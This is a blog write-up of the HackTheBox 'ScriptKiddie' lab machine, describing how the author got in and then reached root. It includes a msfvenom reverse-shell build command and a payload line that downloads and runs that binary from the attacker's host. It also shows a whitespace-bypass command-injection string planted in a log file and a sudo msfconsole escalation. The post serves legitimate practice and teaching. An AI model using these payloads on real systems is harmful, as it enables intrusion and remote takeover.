<!doctype html>
<html lang="en-us">
  <head>
    <title>HTB - ScriptKiddie // SixPraxis</title>
    <link rel="shortcut icon" href="/images/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.82.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="SixPraxis" />
    <meta name="description" content="Write Up for HackTheBox&#39;s ScriptKiddie" />
    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.802b52396e9009f466997720acea24d1773f8e6e5db6e4793067fa2dfd981e02.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTB - ScriptKiddie"/>
<meta name="twitter:description" content="Write Up for HackTheBox&#39;s ScriptKiddie"/>

    <meta property="og:title" content="HTB - ScriptKiddie" />
<meta property="og:description" content="Write Up for HackTheBox&#39;s ScriptKiddie" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://sixpraxis.github.io/posts/scriptkiddie/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-06-05T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-06-05T00:00:00&#43;00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
      <h1>SixPraxis</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
      <div class="app-header-social">
        
          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
  <title>HackTheBox</title>
  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">HTB - ScriptKiddie</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jun 5, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          3 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
              <a class="tag" href="https://sixpraxis.github.io/tags/scriptkiddie/">scriptkiddie</a>
              <a class="tag" href="https://sixpraxis.github.io/tags/easy/">easy</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="scriptkiddie">ScriptKiddie</h1>
<p><img src="/images/htb-scriptkiddie/scriptkiddie.png" alt="ScriptKiddie"></p>
<h3 id="contents">Contents</h3>
<ul>
<li><a href="#WriteUp">Write Up</a></li>
<li><a href="#Recon">Recon</a></li>
<li><a href="#Credentials">Credentials</a></li>
<li><a href="#Notes">Notes</a></li>
</ul>
<h2 id="WriteUp">Write Up</h2>
<p>Initial scan showed two open ports, 22 and 5000. 5000 hosts a web server, so we&rsquo;ll start there. We&rsquo;re greeted with a page titled &ldquo;k1d'5 h4ck3r t00l5&rdquo;, which looks like it&rsquo;ll run certain shell commands with user supplied input. Among the commands are nmap, msfvenom, and searchsploit. Tacking on commands with &amp; doesn&rsquo;t work, neither does using single or double quotes to escape. The MSFVenom section lets us choose an OS, set the lhost, and upload a template file, then it generates a reverse tcp meterpreter bin file. Choosing linux as the OS produces a &ldquo;something went wrong&rdquo; error. After some research, an exploit for MSFVenom exists that allow arbitrary commands to be executed when an apk file is used as a template(EDB-ID: 49491). Using this, we can get our own reverse shell on the target system.</p>
<p><img src="/images/htb-scriptkiddie/scriptkiddie2.png" alt="Evil.apk"></p>
<p>I create my own reverse shell elf and move it to my webserver, then I set the python exploits payload to download, set permissions, and run the elf.</p>
<pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o revx86.elf

payload = 'wget http://10.10.14.5/revx86.elf &amp;&amp; chmod 777 revx86.elf &amp;&amp; ./revx86.elf'
</code></pre><p>I start up a netcat listener for port 4444 and upload the evil apk to the target. Our listener receives a connection and we&rsquo;ve got our shell! <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> upgrades our shell. We&rsquo;re connected as the user &lsquo;kid&rsquo; and navigating to his home directory gets us the user flag.</p>
<p><img src="/images/htb-scriptkiddie/scriptkiddie1.png" alt="User Flag"></p>
<p>To make things easier, we drop in an ssh key and connect using it. Looking around, we find another user named pwn and we have access to their home directory. Inside is a script called scanlosers.sh that launches nmap scan against IPs in the <code>/home/kid/logs/hackers</code> file. We don&rsquo;t have write access to the script, but we do have write access to the hackers log file.</p>
<pre><code>!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&quot; &amp;
done

if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
</code></pre><p>Looking at this code, we can inject our own commands by modifying the hackers file. The code removes spaces, so we can&rsquo;t include any in our command. Instead, we&rsquo;ll use ${IFS%??}, which is a system variable representing white space. All we have to do is give a command to run our earlier elf file, but this time it&rsquo;ll be run by the pwn user giving us a shell with that account.</p>
<blockquote>
<p>whatever.nmap${IFS%??}&amp;${IFS%??}/home/kid/html/revx86.elf${IFS%??}</p>
</blockquote>
<p>Our listener catches the incoming connection and we&rsquo;re now pwn. Unfortunately, we can&rsquo;t drop in our ssh key for this account because the authorized_keys file is owned by root. A quick <code>sudo -l</code> gives us some great information:</p>
<pre><code>User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</code></pre><p>We issue <code>sudo msfconsole</code> and we can move around the file system as root! A <code>cat /root/root.txt</code> pops our root flag.</p>
<p><img src="/images/htb-scriptkiddie/scriptkiddie3.png" alt="Root Flag"></p>
<hr>
<h2 id="Recon">Recon</h2>
<p>Initial Scan:</p>
<pre><code>nmap -sV -p- 10.10.10.226

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><hr>
<h2 id="Credentials">Credentials</h2>
<h4 id="host-users">Host users:</h4>
<pre><code>
</code></pre><h4 id="general">General:</h4>
<hr>
<h2 id="Notes">Notes</h2>
<p>Generated Windows file always has same name: a2ebd5abc8b9.exe</p>
<p><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a></p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
